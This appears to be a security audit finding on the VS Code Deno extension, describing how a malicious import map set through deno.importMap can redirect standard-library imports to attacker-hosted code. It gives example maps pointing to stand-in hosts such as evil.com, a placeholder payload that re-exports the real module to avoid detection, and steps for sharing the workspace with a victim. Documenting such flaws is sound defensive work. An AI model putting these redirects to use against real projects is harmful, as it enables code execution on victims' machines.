# Vulnerability List for VSCode Deno Extension

## Remote Code Execution via Import Maps

### Description
The VS Code Deno extension allows users to specify a custom import map file through the `deno.importMap` setting. An attacker can create a malicious import map that redirects legitimate module specifiers to attacker-controlled code. When a user imports a module using the expected specifier, the Deno CLI would instead load and execute the attacker's code.

Steps to trigger this vulnerability:
1. Create a malicious import map file that redirects common imports to attacker-controlled code
2. Set the `deno.importMap` configuration to point to this malicious file
3. When the user imports a module that matches a redirected specifier, the malicious code would be executed instead of the legitimate module

### Impact
This vulnerability allows for remote code execution in the context of the user's Deno process. This could lead to:
- Exfiltration of sensitive data from the user's system
- Modification or deletion of files accessible by the user
- Further compromise of the user's system through execution of arbitrary code

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension does not have specific mitigations for this vulnerability. It passes the import map directly to the Deno CLI without validation of its contents. The only check is to ensure the setting is not empty:

```typescript
const importMap: string | undefined | null = config.get("importMap");
if (importMap?.trim()) {
  testArgs.push("--import-map", importMap.trim());
}
```

### Missing Mitigations
1. Validate the content of import map files to ensure they only redirect to trusted domains
2. Warn users when they're loading an import map from an untrusted source
3. Provide a mechanism to validate import maps against a whitelist of allowed redirect targets
4. Add a confirmation dialog before using a new or changed import map

### Preconditions
1. The attacker must be able to influence the `deno.importMap` setting in the user's VS Code workspace
2. The attacker must be able to host malicious code that will be loaded via the import map redirect
3. The user must import a module that matches a specifier redirected in the malicious import map

### Source Code Analysis
The vulnerability exists in how import maps are loaded and used in the extension:

1. In `client/src/commands.ts`, when setting up test execution, the extension reads the import map setting from configuration:
```typescript
if (!testArgs.includes("--import-map")) {
  const importMap: string | undefined | null = config.get("importMap");
  if (importMap?.trim()) {
    testArgs.push("--import-map", importMap.trim());
  }
}
```

2. Similarly, when initializing the Deno Language Server in `client/src/extension.ts`:
```typescript
initializationOptions: () => {
  const denoConfiguration = vscode.workspace.getConfiguration().get(
    EXTENSION_NS,
  ) as Record<string, unknown>;
  // ...
  return {
    ...denoConfiguration, // This passes the importMap setting to the language server
    // ...
  } as object;
}
```

3. The `importMap` setting is passed directly to the Deno CLI without any validation of its contents.

4. When Deno resolves imports, it uses the import map to redirect module specifiers, which could lead to loading and executing attacker-controlled code.

For example, if a malicious import map contains:
```json
{
  "imports": {
    "https://deno.land/std/": "https://evil.com/fake-std/"
  }
}
```

When a user imports `https://deno.land/std/http/server.ts`, Deno would instead load `https://evil.com/fake-std/http/server.ts`, which could contain malicious code.

### Security Test Case
To demonstrate this vulnerability:

1. Create a malicious import map file (malicious-map.json):
```json
{
  "imports": {
    "https://deno.land/std/": "https://attacker-controlled-server.com/fake-std/"
  }
}
```

2. Host malicious code at `https://attacker-controlled-server.com/fake-std/http/server.ts` that contains:
```typescript
console.log("Malicious code executed");
// Add malicious payload here
export * from "https://deno.land/std/http/server.ts"; // Re-export the real module to avoid detection
```

3. Create or modify a VS Code workspace configuration to use this import map:
```json
{
  "deno.enable": true,
  "deno.importMap": "./malicious-map.json"
}
```

4. Share this workspace with a victim (e.g., through a GitHub repository)

5. When the victim opens the workspace and writes code that imports from `https://deno.land/std/`, the malicious code from the attacker's server will be executed instead of the legitimate module.

This demonstrates how an attacker could leverage import maps to execute arbitrary code on a victim's system through a seemingly legitimate import statement.
